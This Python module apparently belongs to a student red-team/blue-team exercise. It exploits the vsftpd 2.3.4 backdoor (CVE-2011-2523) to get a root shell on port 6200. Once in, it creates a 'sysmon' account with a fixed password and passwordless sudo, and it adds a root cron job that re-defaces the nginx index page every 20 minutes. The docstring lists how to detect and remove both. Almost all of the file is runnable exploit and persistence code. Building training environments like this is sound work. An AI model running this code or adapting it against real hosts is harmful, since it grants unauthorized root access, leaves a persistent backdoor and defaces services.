"""
Attack 2: vsftpd 2.3.4 backdoor exploit (CVE-2011-2523) + persistence.

vsftpd 2.3.4 contains a backdoor: when a username ending in ':)' is
sent during login, the daemon forks and binds a root shell to TCP
port 6200.  No valid credentials are required.

After gaining the root shell this script sets up two persistence
mechanisms that students will need to find and remove:

  1. Backdoor user account  — "sysmon" / "sysmon123"
       Detectable:  grep -v nologin /etc/passwd
       Fix:         userdel -r sysmon

  2. Root crontab entry — re-defaces the nginx page every 20 minutes
       Detectable:  crontab -l   (run as root or check /var/spool/cron)
       Fix:         crontab -e   (delete the offending line)
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import socket
import time
from config import TARGET_HOST

BACKDOOR_PORT   = 6200
FTP_PORT        = 21
SHELL_TIMEOUT   = 8    # seconds to wait for shell output

# Deface content planted by the cron job (same as ssh_deface so it
# keeps the HTTP check down even after students restore the file manually)
DEFACE_HTML = (
    "<!DOCTYPE html><html><head><title>Service Unavailable</title></head>"
    "<body style='background:#0a0a0a;color:#ff4444;font-family:monospace;"
    "display:flex;align-items:center;justify-content:center;height:100vh;margin:0'>"
    "<h1>ACCESS DENIED</h1></body></html>"
)

# Shell commands run after gaining the backdoor root shell
PERSISTENCE_COMMANDS = [
    # 1. Create backdoor user and grant passwordless sudo
    "useradd -m -s /bin/bash sysmon 2>/dev/null; "
    "echo 'sysmon:sysmon123' | chpasswd; "
    "echo 'sysmon ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysmon; "
    "chmod 440 /etc/sudoers.d/sysmon",

    # 2. Drop the deface page into a hidden dot-file owned by sysmon
    f"echo '{DEFACE_HTML}' > /home/sysmon/.page",

    # 3. Add a root cron job that re-defaces nginx every 20 minutes.
    #    Works for the two most common web roots; harmless if neither exists.
    "( crontab -l 2>/dev/null | grep -v '.page'; "
    "echo '*/20 * * * * "
    "for d in /var/www/html /usr/share/nginx/html; do "
    "[ -f $d/index.html ] && cp /home/sysmon/.page $d/index.html; "
    "done' ) | crontab -",
]


def run(log):
    """
    Trigger the vsftpd 2.3.4 backdoor, connect to the resulting root
    shell on port 6200, and install persistence.

    Args:
        log: callable that accepts a message string for output.

    Returns:
        True if persistence was installed, False otherwise.
    """
    log("  Triggering vsftpd 2.3.4 backdoor (CVE-2011-2523)...")
    if not _trigger(log):
        return False

    time.sleep(1.2)   # give the daemon time to open port 6200

    shell = _connect_shell(log)
    if shell is None:
        return False

    try:
        for cmd in PERSISTENCE_COMMANDS:
            _send(shell, cmd, log)
        log("  Persistence installed (backdoor user + cron deface)")
        return True
    except Exception as e:
        log(f"  Shell interaction error: {e}")
        return False
    finally:
        shell.close()


# ── Internal helpers ──────────────────────────────────────────────────

def _trigger(log):
    """Send the malformed username that activates the backdoor."""
    try:
        sock = socket.create_connection((TARGET_HOST, FTP_PORT), timeout=5)
        sock.recv(1024)                        # banner
        sock.sendall(b"USER pwnd:)\r\n")
        sock.recv(1024)
        sock.sendall(b"PASS irrelevant\r\n")
        time.sleep(0.4)
        sock.close()
        log(f"  Backdoor trigger sent to {TARGET_HOST}:{FTP_PORT}")
        return True
    except Exception as e:
        log(f"  FTP trigger failed: {e}")
        return False


def _connect_shell(log):
    """Connect to the backdoor shell opened on port 6200."""
    try:
        sock = socket.create_connection((TARGET_HOST, BACKDOOR_PORT), timeout=5)
        sock.settimeout(SHELL_TIMEOUT)
        log(f"  Root shell connected on port {BACKDOOR_PORT}")
        return sock
    except Exception as e:
        log(f"  Could not connect to backdoor shell: {e}")
        return None


def _send(shell, cmd, log):
    """Send a command and drain the response."""
    shell.sendall(cmd.encode() + b"\n")
    time.sleep(0.6)
    try:
        out = shell.recv(4096).decode(errors="replace").strip()
        if out:
            log(f"    > {out[:120]}")
    except socket.timeout:
        pass  # no output is fine
